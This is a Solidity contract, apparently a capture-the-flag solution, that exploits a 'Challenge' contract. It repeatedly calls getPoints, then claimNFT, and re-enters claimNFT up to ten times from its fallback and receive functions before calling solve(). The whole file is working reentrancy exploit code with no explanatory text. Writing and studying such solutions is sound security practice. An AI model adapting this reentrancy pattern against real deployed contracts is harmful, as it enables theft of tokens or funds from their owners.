// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import './challenge.sol';

contract Attack {
    Challenge public challenge;
    address public owner;
    uint256 public iterationCount = 0;
    uint256 public constant MAX_ITERATIONS = 10;  // Max iterations to avoid infinite reentrancy loop
    
    constructor(address challAddr) {
        challenge = Challenge(challAddr);
        owner = msg.sender;
    }

    fallback() external payable {
        // Reentrancy attack
        if (iterationCount < MAX_ITERATIONS) {
            iterationCount++;
            bytes32 identifier = keccak256(abi.encodePacked("attacker", "malicious"));
            challenge.claimNFT(identifier);
        }
    }

    receive() external payable {
        // Reentrancy attack
        if (iterationCount < MAX_ITERATIONS) {
            iterationCount++;
            bytes32 identifier = keccak256(abi.encodePacked("attacker", "malicious"));
            challenge.claimNFT(identifier);
        }
    }

    function attack() public {
        require(msg.sender == owner, "Only the owner can attack");
        
        bytes32 identifier = keccak256(abi.encodePacked("attacker", "malicious"));
        
        for (int i=0; i<10; i++) {
            challenge.getPoints("attacker", "malicious");
        }

        challenge.claimNFT(identifier);

        challenge.solve();
    }
}
